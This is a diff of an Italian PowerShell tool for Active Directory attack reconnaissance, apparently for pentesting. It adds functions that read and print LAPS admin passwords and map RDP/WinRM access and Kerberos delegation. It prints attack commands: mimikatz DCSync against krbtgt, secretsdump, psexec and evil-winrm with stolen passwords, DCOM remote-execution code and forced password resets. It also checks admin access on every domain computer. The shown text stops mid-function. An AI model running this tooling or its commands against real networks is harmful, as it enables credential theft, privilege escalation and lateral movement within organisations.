         $findings += Get-DangerousACL -ObjectDN $gpoDN -ObjectName $gpoName -ObjectType "GPO"
         $gpoCount++
     }
-    Write-Host "        Analizzate $gpoCount GPO" -ForegroundColor DarkGray
+    Write-Both "        Analizzate $gpoCount GPO" -Color DarkGray
     
     # Enumera Organizational Units
     Write-SubSection "Analisi ACL su Organizational Units..."
@@ -1203,12 +1601,12 @@ function Get-ACLAbuse {
         $findings += Get-DangerousACL -ObjectDN $ouDN -ObjectName $ouName -ObjectType "OU"
         $ouCount++
     }
-    Write-Host "        Analizzate $ouCount OU" -ForegroundColor DarkGray
+    Write-Both "        Analizzate $ouCount OU" -Color DarkGray
     
     # Analisi Domain Object
     Write-SubSection "Analisi ACL su Domain Object..."
     $findings += Get-DangerousACL -ObjectDN $DN -ObjectName "DOMAIN ROOT" -ObjectType "Domain"
-    Write-Host "        Analizzato Domain Object" -ForegroundColor DarkGray
+    Write-Both "        Analizzato Domain Object" -Color DarkGray
     
     # Controlla DCSync rights sul dominio
     Write-SubSection "Analisi DCSync Rights..."
@@ -1247,17 +1645,17 @@ function Get-ACLAbuse {
         }
     }
     catch {}
-    Write-Host "        Analizzati DCSync Rights" -ForegroundColor DarkGray
-    
+    Write-Both "        Analizzati DCSync Rights" -Color DarkGray
+
     # Analisi AdminSDHolder
     Write-SubSection "Analisi ACL su AdminSDHolder..."
     $adminSDHolderDN = "CN=AdminSDHolder,CN=System,$DN"
     try {
         $findings += Get-DangerousACL -ObjectDN $adminSDHolderDN -ObjectName "AdminSDHolder" -ObjectType "AdminSDHolder"
-        Write-Host "        Analizzato AdminSDHolder" -ForegroundColor DarkGray
+        Write-Both "        Analizzato AdminSDHolder" -Color DarkGray
     }
     catch {
-        Write-Host "        AdminSDHolder non accessibile" -ForegroundColor DarkGray
+        Write-Both "        AdminSDHolder non accessibile" -Color DarkGray
     }
     
     # Analisi Certificate Templates (AD CS)
@@ -1283,13 +1681,13 @@ function Get-ACLAbuse {
         }
         
         if ($certCount -gt 0) {
-            Write-Host "        Analizzati $certCount Certificate Templates" -ForegroundColor DarkGray
+            Write-Both "        Analizzati $certCount Certificate Templates" -Color DarkGray
         } else {
-            Write-Host "        Nessun Certificate Template trovato" -ForegroundColor DarkGray
+            Write-Both "        Nessun Certificate Template trovato" -Color DarkGray
         }
     }
     catch {
-        Write-Host "        AD CS non installato o non accessibile" -ForegroundColor DarkGray
+        Write-Both "        AD CS non installato o non accessibile" -Color DarkGray
     }
     
     # Mostra risultati
@@ -1319,12 +1717,9 @@ function Get-ACLAbuse {
                 
                 $dangerColor = if ($finding.Dangerous -match 'GenericAll|DCSync|WriteDacl') { 'Red' } else { 'Yellow' }
                 
-                Write-Host "        [$($finding.TargetType)] " -ForegroundColor $typeColor -NoNewline
-                Write-Host "$($finding.TargetObject)" -ForegroundColor White -NoNewline
-                Write-Host " -> " -NoNewline
-                Write-Host "$($finding.Dangerous)" -ForegroundColor $dangerColor
+                Write-Both "        [$($finding.TargetType)] $($finding.TargetObject) -> $($finding.Dangerous)" -Color $dangerColor
             }
-            Write-Host ""
+            Write-Both ""
         }
         
         Write-Section "POSSIBILI ATTACCHI"
@@ -1338,37 +1733,37 @@ function Get-ACLAbuse {
             $gaGPOs = $genericAllFindings | Where-Object { $_.TargetType -eq 'GPO' }
             
             Write-Info "GenericAll trovato - Puoi:"
-            Write-Host "        - Cambiare password dell'oggetto target" -ForegroundColor White
-            Write-Host "        - Aggiungere utenti a gruppi" -ForegroundColor White
-            Write-Host "        - Modificare qualsiasi attributo" -ForegroundColor White
-            Write-Host ""
-            
+            Write-Both "        - Cambiare password dell'oggetto target" -Color White
+            Write-Both "        - Aggiungere utenti a gruppi" -Color White
+            Write-Both "        - Modificare qualsiasi attributo" -Color White
+            Write-Both ""
+
             if ($gaGroups) {
-                Write-Host "        # Aggiungi utente a gruppo:" -ForegroundColor Yellow
+                Write-Both "        # Aggiungi utente a gruppo:" -Color Yellow
                 foreach ($f in $gaGroups | Select-Object -First 3) {
-                    Write-Host "        net group `"$($f.TargetObject)`" <tuouser> /add /domain" -ForegroundColor Gray
+                    Write-Both "        net group `"$($f.TargetObject)`" <tuouser> /add /domain" -Color Gray
                 }
-                Write-Host ""
+                Write-Both ""
             }
-            
+
             if ($gaUsers) {
-                Write-Host "        # Cambia password utente:" -ForegroundColor Yellow
+                Write-Both "        # Cambia password utente:" -Color Yellow
                 foreach ($f in $gaUsers | Select-Object -First 3) {
-                    Write-Host "        net user $($f.TargetObject) NuovaPassword123! /domain" -ForegroundColor Gray
+                    Write-Both "        net user $($f.TargetObject) NuovaPassword123! /domain" -Color Gray
                 }
-                Write-Host ""
+                Write-Both ""
             }
-            
+
             if ($gaComputers) {
-                Write-Host "        # RBCD Attack su computer:" -ForegroundColor Yellow
-                Write-Host "        # Configura Resource-Based Constrained Delegation" -ForegroundColor Gray
-                Write-Host ""
+                Write-Both "        # RBCD Attack su computer:" -Color Yellow
+                Write-Both "        # Configura Resource-Based Constrained Delegation" -Color Gray
+                Write-Both ""
             }
-            
+
             if ($gaGPOs) {
-                Write-Host "        # Modifica GPO per eseguire codice:" -ForegroundColor Yellow
-                Write-Host "        # Aggiungi Immediate Scheduled Task nella GPO" -ForegroundColor Gray
-                Write-Host ""
+                Write-Both "        # Modifica GPO per eseguire codice:" -Color Yellow
+                Write-Both "        # Aggiungi Immediate Scheduled Task nella GPO" -Color Gray
+                Write-Both ""
             }
         }
         
@@ -1376,38 +1771,38 @@ function Get-ACLAbuse {
         $dcSyncFindings = $findings | Where-Object { $_.Dangerous -eq 'DCSync' }
         if ($dcSyncFindings) {
             Write-Warning "DCSync Rights trovato - Puoi estrarre TUTTI gli hash!"
-            Write-Host "        mimikatz # lsadump::dcsync /user:Administrator" -ForegroundColor Yellow
-            Write-Host "        mimikatz # lsadump::dcsync /user:krbtgt" -ForegroundColor Yellow
-            Write-Host "        impacket-secretsdump domain/user@DC" -ForegroundColor Yellow
-            Write-Host ""
+            Write-Both "        mimikatz # lsadump::dcsync /user:Administrator" -Color Yellow
+            Write-Both "        mimikatz # lsadump::dcsync /user:krbtgt" -Color Yellow
+            Write-Both "        impacket-secretsdump domain/user@DC" -Color Yellow
+            Write-Both ""
         }
-        
+
         # Write permissions
         $writeFindings = $findings | Where-Object { $_.Dangerous -match 'Write|Self' }
         if ($writeFindings) {
             Write-Info "Write permissions trovate - Puoi:"
-            Write-Host "        - WriteDacl: Modificare i permessi dell'oggetto" -ForegroundColor White
-            Write-Host "        - WriteOwner: Diventare proprietario dell'oggetto" -ForegroundColor White
-            Write-Host "        - Self: Aggiungerti a gruppi (Self-Membership)" -ForegroundColor White
-            Write-Host ""
+            Write-Both "        - WriteDacl: Modificare i permessi dell'oggetto" -Color White
+            Write-Both "        - WriteOwner: Diventare proprietario dell'oggetto" -Color White
+            Write-Both "        - Self: Aggiungerti a gruppi (Self-Membership)" -Color White
+            Write-Both ""
         }
-        
+
         # AdminSDHolder
         $adminSDFindings = $findings | Where-Object { $_.TargetType -eq 'AdminSDHolder' }
         if ($adminSDFindings) {
             Write-Warning "Permessi su AdminSDHolder - Persistenza!"
-            Write-Host "        # Modifica AdminSDHolder per ottenere permessi permanenti" -ForegroundColor Yellow
-            Write-Host "        # SDProp propagherà le modifiche ogni 60 minuti" -ForegroundColor Yellow
-            Write-Host ""
+            Write-Both "        # Modifica AdminSDHolder per ottenere permessi permanenti" -Color Yellow
+            Write-Both "        # SDProp propagherà le modifiche ogni 60 minuti" -Color Yellow
+            Write-Both ""
         }
-        
+
         # Certificate Templates
         $certFindings = $findings | Where-Object { $_.TargetType -eq 'CertTemplate' }
         if ($certFindings) {
             Write-Warning "Permessi su Certificate Templates - ESC attacks!"
-            Write-Host "        # Possibili attacchi ESC1-ESC8" -ForegroundColor Yellow
-            Write-Host "        Certify.exe find /vulnerable" -ForegroundColor Yellow
-            Write-Host ""
+            Write-Both "        # Possibili attacchi ESC1-ESC8" -Color Yellow
+            Write-Both "        Certify.exe find /vulnerable" -Color Yellow
+            Write-Both ""
         }
         
     } else {
@@ -1429,7 +1824,7 @@ function Get-LocalAdminAccess {
     Write-Section "Test accesso Admin su tutti i computer"
     Write-Info "Utente corrente: $env:USERDOMAIN\$env:USERNAME"
     Write-Info "Host corrente: $currentHost (escluso dal test)"
-    Write-Host ""
+    Write-Both ""
     
     $adminAccess = @()
     
@@ -1440,7 +1835,7 @@ function Get-LocalAdminAccess {
     
         # Salta l'host corrente (case-insensitive)
         if ($name.ToLower() -eq $currentHost -or $hostname.StartsWith("$currentHost.")) {
-            Write-Host "    [*] $name - Host corrente (skipped)" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Host corrente (skipped)" -Color DarkGray
             continue
         }
         
@@ -1455,14 +1850,14 @@ function Get-LocalAdminAccess {
                 Write-Warning "$name ($hostname) - ADMIN ACCESS CONFERMATO!"
             }
             else {
-                Write-Host "    [*] $name - Accesso negato" -ForegroundColor DarkGray
+                Write-Both "    [*] $name - Accesso negato" -Color DarkGray
             }
         }
         catch [System.UnauthorizedAccessException] {
-            Write-Host "    [*] $name - Accesso negato" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Accesso negato" -Color DarkGray
         }
         catch {
-            Write-Host "    [*] $name - Non raggiungibile" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Non raggiungibile" -Color DarkGray
         }
     }
     
@@ -1471,7 +1866,7 @@ function Get-LocalAdminAccess {
         foreach ($h in $adminAccess) {
             Write-Warning $h
         }
-        Write-Host ""
+        Write-Both ""
         Write-Info "Puoi connetterti a questi computer ed estrarre credenziali!"
     } else {
         Write-Info "Nessun accesso admin locale trovato con l'utente corrente"
@@ -1521,7 +1916,7 @@ function Get-DomainLoggedOnUsers {
     
     Write-Section "Enumerazione sessioni via Remote Registry"
     Write-Info "Nota: Richiede Remote Registry attivo sul target (default su Server)"
-    Write-Host ""
+    Write-Both ""
     
     $sessionsFound = @{}
     
@@ -1533,10 +1928,10 @@ function Get-DomainLoggedOnUsers {
         $users = Get-LoggedOnUsersRemoteRegistry -ComputerName $hostname
         
         if ($null -eq $users) {
-            Write-Host "    [*] $name - Remote Registry non disponibile" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Remote Registry non disponibile" -Color DarkGray
         }
         elseif ($users.Count -eq 0) {
-            Write-Host "    [*] $name - Nessun utente loggato" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Nessun utente loggato" -Color DarkGray
         }
         else {
             Write-SubSection $name
@@ -1560,7 +1955,7 @@ function Get-DomainLoggedOnUsers {
             }
         }
         
-        Write-Host ""
+        Write-Both ""
         Write-Info "Se hai admin access su questi computer, puoi rubare le credenziali!"
     }
 }
@@ -1572,7 +1967,7 @@ function Get-DomainSessionsWMI {
     
     Write-Section "Enumerazione sessioni via WMI (Win32_ComputerSystem)"
     Write-Info "Nota: Richiede privilegi admin sul target"
-    Write-Host ""
+    Write-Both ""
     
     $sessionsFound = @{}
     
@@ -1595,14 +1990,14 @@ function Get-DomainSessionsWMI {
                 $sessionsFound[$loggedUser] += $name
             }
             else {
-                Write-Host "    [*] $name - Nessuna sessione interattiva" -ForegroundColor DarkGray
+                Write-Both "    [*] $name - Nessuna sessione interattiva" -Color DarkGray
             }
         }
         catch [System.UnauthorizedAccessException] {
-            Write-Host "    [*] $name - Accesso WMI negato" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Accesso WMI negato" -Color DarkGray
         }
         catch {
-            Write-Host "    [*] $name - Non raggiungibile" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Non raggiungibile" -Color DarkGray
         }
     }
     
@@ -1625,7 +2020,7 @@ function Get-DCOMAccess {
     Write-Section "Enumerazione membri 'Distributed COM Users' su computer"
     Write-Info "Nota: Richiede accesso al gruppo locale via WinNT provider"
     Write-Info "Chi ha questi permessi può eseguire codice remoto via DCOM"
-    Write-Host ""
+    Write-Both ""
     
     $dcomAccess = @{}
     $computersWithDCOM = @()
@@ -1642,7 +2037,7 @@ function Get-DCOMAccess {
             $socket.Close()
         }
         catch {
-            Write-Host "    [*] $name - Non raggiungibile (porta 135)" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Non raggiungibile (porta 135)" -Color DarkGray
             continue
         }
         
@@ -1670,14 +2065,14 @@ function Get-DCOMAccess {
                 }
             }
             else {
-                Write-Host "    [*] $name - Nessun membro custom in Distributed COM Users" -ForegroundColor DarkGray
+                Write-Both "    [*] $name - Nessun membro custom in Distributed COM Users" -Color DarkGray
             }
         }
         catch [System.Runtime.InteropServices.COMException] {
-            Write-Host "    [*] $name - Accesso negato al gruppo locale" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Accesso negato al gruppo locale" -Color DarkGray
         }
         catch {
-            Write-Host "    [*] $name - Errore: $($_.Exception.Message)" -ForegroundColor DarkGray
+            Write-Both "    [*] $name - Errore: $($_.Exception.Message)" -Color DarkGray
         }
     }
     
@@ -1690,23 +2085,23 @@ function Get-DCOMAccess {
             foreach ($comp in $dcomAccess[$principal]) {
                 Write-Finding "Computer" $comp
             }
-            Write-Host ""
+            Write-Both ""
         }
         
         Write-Section "ATTACCHI DCOM"
         Write-Info "Se hai credenziali di un utente con DCOM access, puoi eseguire codice:"
-        Write-Host ""
-        Write-Host "        # PowerShell - MMC20.Application" -ForegroundColor Yellow
-        Write-Host '        $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))' -ForegroundColor Gray
-        Write-Host '        $com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami > C:\test.txt", "7")' -ForegroundColor Gray
-        Write-Host ""
-        Write-Host "        # PowerShell - ShellWindows" -ForegroundColor Yellow
-        Write-Host '        $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))' -ForegroundColor Gray
-        Write-Host '        $com.Item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)' -ForegroundColor Gray
-        Write-Host ""
-        Write-Host "        # Impacket - dcomexec.py" -ForegroundColor Yellow
-        Write-Host '        dcomexec.py domain/user:password@TARGET' -ForegroundColor Gray
-        Write-Host ""
+        Write-Both ""
+        Write-Both "        # PowerShell - MMC20.Application" -Color Yellow
+        Write-Both '        $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))' -Color Gray
+        Write-Both '        $com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami > C:\test.txt", "7")' -Color Gray
+        Write-Both ""
+        Write-Both "        # PowerShell - ShellWindows" -Color Yellow
+        Write-Both '        $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))' -Color Gray
+        Write-Both '        $com.Item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)' -Color Gray
+        Write-Both ""
+        Write-Both "        # Impacket - dcomexec.py" -Color Yellow
+        Write-Both '        dcomexec.py domain/user:password@TARGET' -Color Gray
+        Write-Both ""
     } else {
         Write-Info "Nessun utente/gruppo custom trovato in 'Distributed COM Users'"
         Write-Info "Nota: Local Admins hanno sempre accesso DCOM implicitamente"
@@ -1715,50 +2110,823 @@ function Get-DCOMAccess {
 
 #endregion
 
+function Get-RemoteAccessPermissions {
+    Write-Banner "PERMESSI RDP E PSREMOTING"
+    
+    Write-Section "Enumerazione Remote Desktop Users e Remote Management Users"
+    Write-Info "Enumera quali utenti di dominio possono fare RDP/PSRemoting su ogni macchina"
+    Write-Both ""
+    
+    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
+    
+    $rdpAccess = @()      # Chi può fare RDP
+    $winrmAccess = @()    # Chi può fare PSRemoting
+    
+    # Gruppi da enumerare
+    $groupsToCheck = @(
+        @{ Name = "Remote Desktop Users"; Type = "RDP" },
+        @{ Name = "Remote Management Users"; Type = "WinRM" },
+        @{ Name = "WinRMRemoteWMIUsers__"; Type = "WinRM" }
+    )
+    
+    foreach ($computer in $computers) {
+        $hostname = $computer.Properties.dnshostname[0]
+        $name = $computer.Properties.name[0]
+        if (-not $hostname) { continue }
+        
+        # Test connettività (porta 445 per WinNT provider)
+        $reachable = $false
+        try {
+            $socket = New-Object System.Net.Sockets.TcpClient
+            $async = $socket.BeginConnect($hostname, 445, $null, $null)
+            $wait = $async.AsyncWaitHandle.WaitOne(1000, $false)
+            $reachable = $wait -and $socket.Connected
+            $socket.Close()
+        } catch {}
+        
+        if (-not $reachable) {
+            Write-Both "    [*] $name - Non raggiungibile" -Color DarkGray
+            continue
+        }
+        
+        $computerRDP = @()
+        $computerWinRM = @()
+        
+        foreach ($groupInfo in $groupsToCheck) {
+            $groupName = $groupInfo.Name
+            $accessType = $groupInfo.Type
+            
+            try {
+                $group = [ADSI]"WinNT://$hostname/$groupName,group"
+                $members = @($group.Invoke("Members"))
+                
+                foreach ($member in $members) {
+                    try {
+                        $adsPath = $member.GetType().InvokeMember("AdsPath", 'GetProperty', $null, $member, $null)
+                        $memberName = $member.GetType().InvokeMember("Name", 'GetProperty', $null, $member, $null)
+                        $memberClass = $member.GetType().InvokeMember("Class", 'GetProperty', $null, $member, $null)
+                        
+                        # Parse AdsPath per determinare dominio
+                        # Formato: WinNT://DOMAIN/username o WinNT://HOSTNAME/username
+                        $isDomain = $false
+                        $fullName = $memberName
+                        
+                        if ($adsPath -match "WinNT://([^/]+)/([^/]+)$") {
+                            $source = $matches[1].ToUpper()
+                            
+                            # Se source non è l'hostname, è un account di dominio
+                            if ($source -ne $hostname.Split('.')[0].ToUpper() -and $source -ne $name.ToUpper()) {
+                                $isDomain = $true
+                                $fullName = "$source\$memberName"
+                            }
+                        }
+                        
+                        # Ci interessano solo account di dominio
+                        if ($isDomain) {
+                            $memberInfo = [PSCustomObject]@{
+                                Computer = $name
+                                Hostname = $hostname
+                                Member = $fullName
+                                MemberType = $memberClass  # User o Group
+                                ViaGroup = $groupName
+                            }
+                            
+                            if ($accessType -eq "RDP") {
+                                $computerRDP += $memberInfo
+                            } else {
+                                $computerWinRM += $memberInfo
+                            }
+                        }
+                    } catch {}
+                }
+            }
+            catch {
+                # Gruppo non esiste o accesso negato
+            }
+        }
+        
+        # Output per questo computer
+        if ($computerRDP.Count -gt 0 -or $computerWinRM.Count -gt 0) {
+            Write-SubSection "$name ($hostname)"
+            
+            if ($computerRDP.Count -gt 0) {
+                Write-Finding "Remote Desktop Users" ""
+                foreach ($m in $computerRDP) {
+                    $typeTag = if ($m.MemberType -eq "Group") { "[G]" } else { "[U]" }
+                    Write-Both "            $typeTag $($m.Member)" -Color Yellow
+                }
+                $rdpAccess += $computerRDP
+            }
+
+            if ($computerWinRM.Count -gt 0) {
+                Write-Finding "Remote Management Users" ""
+                foreach ($m in $computerWinRM) {
+                    $typeTag = if ($m.MemberType -eq "Group") { "[G]" } else { "[U]" }
+                    Write-Both "            $typeTag $($m.Member)" -Color Cyan
+                }
+                $winrmAccess += $computerWinRM
+            }
+        } else {
+            Write-Both "    [*] $name - Nessun utente di dominio in RDP/WinRM groups" -Color DarkGray
+        }
+    }
+    
+    #region Riepilogo per Utente/Gruppo
+    
+    Write-Section "RIEPILOGO RDP ACCESS PER UTENTE/GRUPPO"
+    if ($rdpAccess.Count -gt 0) {
+        $byMember = $rdpAccess | Group-Object -Property Member
+        foreach ($g in ($byMember | Sort-Object -Property Name)) {
+            $memberType = $g.Group[0].MemberType
+            $typeTag = if ($memberType -eq "Group") { "[GROUP]" } else { "[USER]" }
+            Write-Warning "$($g.Name) $typeTag può fare RDP su:"
+            foreach ($access in $g.Group) {
+                Write-Both "            -> $($access.Computer) ($($access.Hostname))" -Color White
+            }
+            Write-Both ""
+        }
+    } else {
+        Write-Info "Nessun utente di dominio con RDP access trovato"
+    }
+    
+    Write-Section "RIEPILOGO PSREMOTING ACCESS PER UTENTE/GRUPPO"
+    if ($winrmAccess.Count -gt 0) {
+        $byMember = $winrmAccess | Group-Object -Property Member
+        foreach ($g in ($byMember | Sort-Object -Property Name)) {
+            $memberType = $g.Group[0].MemberType
+            $typeTag = if ($memberType -eq "Group") { "[GROUP]" } else { "[USER]" }
+            Write-Warning "$($g.Name) $typeTag può fare PSRemoting su:"
+            foreach ($access in $g.Group) {
+                Write-Both "            -> $($access.Computer) ($($access.Hostname))" -Color White
+            }
+            Write-Both ""
+        }
+    } else {
+        Write-Info "Nessun utente di dominio con PSRemoting access trovato"
+    }
+    
+    #endregion
+    
+    #region Espansione Gruppi (opzionale ma utile)
+    
+    Write-Section "ESPANSIONE GRUPPI DI DOMINIO"
+    Write-Info "Membri dei gruppi di dominio che hanno accesso remoto"
+    Write-Both ""
+    
+    # Trova tutti i gruppi unici
+    $allGroups = @()
+    $allGroups += ($rdpAccess | Where-Object { $_.MemberType -eq "Group" } | Select-Object -ExpandProperty Member -Unique)
+    $allGroups += ($winrmAccess | Where-Object { $_.MemberType -eq "Group" } | Select-Object -ExpandProperty Member -Unique)
+    $allGroups = $allGroups | Select-Object -Unique
+    
+    foreach ($groupFullName in $allGroups) {
+        # Estrai nome gruppo senza dominio
+        $groupShortName = $groupFullName.Split('\')[-1]
+        
+        try {
+            $groupObj = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=$groupShortName))"
+            if ($groupObj) {
+                $members = $groupObj.Properties.member
+                
+                Write-SubSection "$groupFullName"
+                
+                if ($members -and $members.Count -gt 0) {
+                    foreach ($memberDN in $members) {
+                        if ($memberDN -match "CN=([^,]+)") {
+                            Write-Both "            -> $($matches[1])" -Color White
+                        }
+                    }
+                } else {
+                    Write-Both "            (nessun membro)" -Color DarkGray
+                }
+            }
+        }
+        catch {}
+    }
+    
+    #endregion
+    
+    #region Statistiche finali
+    
+    Write-Section "STATISTICHE"
+    
+    $uniqueRDPUsers = ($rdpAccess | Where-Object { $_.MemberType -eq "User" } | Select-Object -ExpandProperty Member -Unique).Count
+    $uniqueRDPGroups = ($rdpAccess | Where-Object { $_.MemberType -eq "Group" } | Select-Object -ExpandProperty Member -Unique).Count
+    $uniqueWinRMUsers = ($winrmAccess | Where-Object { $_.MemberType -eq "User" } | Select-Object -ExpandProperty Member -Unique).Count
+    $uniqueWinRMGroups = ($winrmAccess | Where-Object { $_.MemberType -eq "Group" } | Select-Object -ExpandProperty Member -Unique).Count
+    
+    Write-Finding "RDP - Utenti di dominio" $uniqueRDPUsers
+    Write-Finding "RDP - Gruppi di dominio" $uniqueRDPGroups
+    Write-Finding "WinRM - Utenti di dominio" $uniqueWinRMUsers
+    Write-Finding "WinRM - Gruppi di dominio" $uniqueWinRMGroups
+    
+    #endregion
+}
+
+function Get-LAPSPasswords {
+    Write-Banner "LAPS (Local Administrator Password Solution)"
+    
+    Write-Section "Ricerca password LAPS leggibili"
+    Write-Info "LAPS memorizza password admin locali in ms-Mcs-AdmPwd"
+    Write-Both ""
+    
+    $lapsComputers = @()
+    
+    try {
+        $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
+        
+        foreach ($computer in $computers) {
+            $name = $computer.Properties.name[0]
+            $lapsPassword = $null
+            $lapsExpiration = $null
+            
+            # Legacy LAPS (ms-Mcs-AdmPwd)
+            if ($computer.Properties.'ms-mcs-admpwd') {
+                $lapsPassword = $computer.Properties.'ms-mcs-admpwd'[0]
+            }
+            
+            # Expiration time
+            if ($computer.Properties.'ms-mcs-admpwdexpirationtime') {
+                try {
+                    $expTime = [int64]$computer.Properties.'ms-mcs-admpwdexpirationtime'[0]
+                    if ($expTime -gt 0) {
+                        $lapsExpiration = [datetime]::FromFileTime($expTime)
+                    }
+                } catch {}
+            }
+            
+            # Windows LAPS (msLAPS-Password)
+            if ($computer.Properties.'mslaps-password') {
+                $lapsPassword = $computer.Properties.'mslaps-password'[0]
+            }
+            
+            if ($lapsPassword) {
+                $lapsComputers += [PSCustomObject]@{
+                    ComputerName = $name
+                    Password = $lapsPassword
+                    Expiration = $lapsExpiration
+                    DN = $computer.Properties.distinguishedname[0]
+                }
+            }
+        }
+    }
+    catch {
+        Write-Warning "Errore durante la ricerca LAPS: $_"
+    }
+    
+    if ($lapsComputers.Count -gt 0) {
+        Write-Section "PASSWORD LAPS TROVATE! ($($lapsComputers.Count) computer)"
+        
+        foreach ($comp in $lapsComputers) {
+            Write-Warning "$($comp.ComputerName)"
+            Write-Finding "Password" $comp.Password -Important
+            if ($comp.Expiration) {
+                Write-Finding "Scadenza" $comp.Expiration
+            }
+            Write-Both ""
+        }
+        
+        Write-Section "ATTACCHI CON LAPS PASSWORD"
+        Write-Both "        # Connetti con password LAPS (local admin)" -Color Yellow
+        Write-Both "        impacket-psexec ./Administrator:'<password>'@<target>" -Color Gray
+        Write-Both "        impacket-wmiexec ./Administrator:'<password>'@<target>" -Color Gray
+        Write-Both "        evil-winrm -i <target> -u Administrator -p '<password>'" -Color Gray
+        Write-Both ""
+        Write-Both "        # Da PowerShell" -Color Yellow
+        Write-Both '        $cred = New-Object PSCredential(".\Administrator", (ConvertTo-SecureString "<password>" -AsPlainText -Force))' -Color Gray
+        Write-Both '        Enter-PSSession -ComputerName <target> -Credential $cred' -Color Gray
+        
+    } else {
+        Write-Info "Nessuna password LAPS leggibile con l'utente corrente"
+        Write-Both ""
+        Write-Info "LAPS potrebbe essere configurato ma non hai permessi di lettura"
+    }
+    
+    # Verifica se LAPS schema esiste
+    Write-Section "Verifica Schema LAPS"
+    try {
+        $DN = ([adsi]'').distinguishedName
+        $configDN = "CN=Schema,CN=Configuration,$DN"
+        
+        $lapsLegacy = LDAPSearch -LDAPQuery "(cn=ms-Mcs-AdmPwd)" -SearchBase $configDN
+        $lapsWindows = LDAPSearch -LDAPQuery "(cn=msLAPS-Password)" -SearchBase $configDN
+        
+        if ($lapsLegacy -or $lapsWindows) {
+            Write-Info "LAPS è installato nel dominio"
+            if ($lapsLegacy) { Write-Finding "Legacy LAPS" "Schema presente (ms-Mcs-AdmPwd)" }
+            if ($lapsWindows) { Write-Finding "Windows LAPS" "Schema presente (msLAPS-Password)" }
+        } else {
+            Write-Info "Schema LAPS non trovato - LAPS potrebbe non essere configurato"
+        }
+    }
+    catch {
+        Write-Both "        Impossibile verificare schema LAPS" -Color DarkGray
+    }
+}
+
+function Get-DelegationInfo {
+    Write-Banner "KERBEROS DELEGATION"
+    
+    Write-Section "Analisi configurazioni di delegation"
+    Write-Info "Delegation permette a servizi di impersonare utenti"
+    Write-Info "Tipi: Unconstrained, Constrained, Resource-Based (RBCD)"
+    Write-Both ""
+    
+    $unconstrainedDelegation = @()
+    $constrainedDelegation = @()
+    $rbcdDelegation = @()
+    
+    #region Unconstrained Delegation
+    Write-SubSection "Ricerca Unconstrained Delegation..."
+    
+    # UAC flag TRUSTED_FOR_DELEGATION = 524288 (0x80000)
+    # Escludi Domain Controllers (primaryGroupID=516)
+    try {
+        $unconstrained = LDAPSearch -LDAPQuery "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))"
+        
+        foreach ($obj in $unconstrained) {
+            $name = $obj.Properties.samaccountname[0]
+            $dn = $obj.Properties.distinguishedname[0]
+            $objectClass = $obj.Properties.objectclass
+            $type = if ($objectClass -contains 'computer') { 'Computer' } else { 'User' }
+            
+            $unconstrainedDelegation += [PSCustomObject]@{
+                Name = $name
+                Type = $type
+                DN = $dn
+            }
+        }
+    }
+    catch {
+        Write-Warning "Errore ricerca Unconstrained Delegation: $_"
+    }
+    #endregion
+    
+    #region Constrained Delegation
+    Write-SubSection "Ricerca Constrained Delegation..."
+    
+    # msDS-AllowedToDelegateTo contiene i servizi target
+    try {
+        $constrained = LDAPSearch -LDAPQuery "(msDS-AllowedToDelegateTo=*)"
+        
+        foreach ($obj in $constrained) {
+            $name = $obj.Properties.samaccountname[0]
+            $dn = $obj.Properties.distinguishedname[0]
+            $delegateTo = $obj.Properties.'msds-allowedtodelegateto'
+            $objectClass = $obj.Properties.objectclass
+            $type = if ($objectClass -contains 'computer') { 'Computer' } else { 'User' }
+            
+            # Controlla se ha Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION = 16777216)
+            $uac = [int64]$obj.Properties.useraccountcontrol[0]
+            $protocolTransition = ($uac -band 16777216) -ne 0
+            
+            $constrainedDelegation += [PSCustomObject]@{
+                Name = $name
+                Type = $type
+                DN = $dn
+                DelegateTo = @($delegateTo)
+                ProtocolTransition = $protocolTransition
+            }
+        }
+    }
+    catch {
+        Write-Warning "Errore ricerca Constrained Delegation: $_"
+    }
+    #endregion
+    
+    #region Resource-Based Constrained Delegation (RBCD)
+    Write-SubSection "Ricerca Resource-Based Constrained Delegation..."
+    
+    # msDS-AllowedToActOnBehalfOfOtherIdentity contiene chi può delegare verso questo oggetto
+    try {
+        $rbcd = LDAPSearch -LDAPQuery "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
+        
+        foreach ($obj in $rbcd) {
+            $name = $obj.Properties.samaccountname[0]
+            $dn = $obj.Properties.distinguishedname[0]
+            $objectClass = $obj.Properties.objectclass
+            $type = if ($objectClass -contains 'computer') { 'Computer' } else { 'User' }
+            
+            # Decodifica il Security Descriptor per trovare chi può delegare
+            $allowedPrincipals = @()
+            $rawSD = $obj.Properties.'msds-allowedtoactonbehalfofotheridentity'[0]
+            
+            if ($rawSD) {
+                try {
+                    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($rawSD, 0)
+                    foreach ($ace in $sd.DiscretionaryAcl) {
+                        try {
+                            $sid = $ace.SecurityIdentifier
+                            $principal = $sid.Translate([System.Security.Principal.NTAccount]).Value
+                            $allowedPrincipals += $principal
+                        }
+                        catch {
+                            $allowedPrincipals += $ace.SecurityIdentifier.Value
+                        }
+                    }
+                }
